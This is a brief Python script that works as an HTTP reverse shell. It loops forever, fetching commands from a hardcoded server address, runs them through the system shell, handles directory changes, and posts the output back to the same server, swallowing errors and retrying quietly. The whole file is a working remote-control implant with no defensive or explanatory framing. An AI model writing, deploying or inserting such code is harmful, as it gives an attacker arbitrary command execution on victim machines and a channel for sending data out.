import urllib.request
import subprocess
import os
import time
server_url = "http://0.0.0.0:4445/"
while True:
    try:
        req = urllib.request.Request(server_url,method="GET")
        response = urllib.request.urlopen(req)
        cmd = response.read().decode().strip()
        if not cmd:
            time.sleep(1)
            continue
        if cmd.lower().startswith("cd "):
            path = cmd[3:].strip()
            try:
                os.chdir(path)
                result = f"[+] Changed directory to {os.getcwd()}\n"
            except Exception as e:
                result = f"[-] cd failed: {e}\n"
        else:
            output = subprocess.run(cmd,shell=True,capture_output=True,text=True)
            result = output.stdout + output.stderr
        req_post = urllib.request.Request(server_url,data=result.encode(),method="POST")
        with urllib.request.urlopen(req_post) as response:
            pass
    except Exception as e:
        time.sleep(5)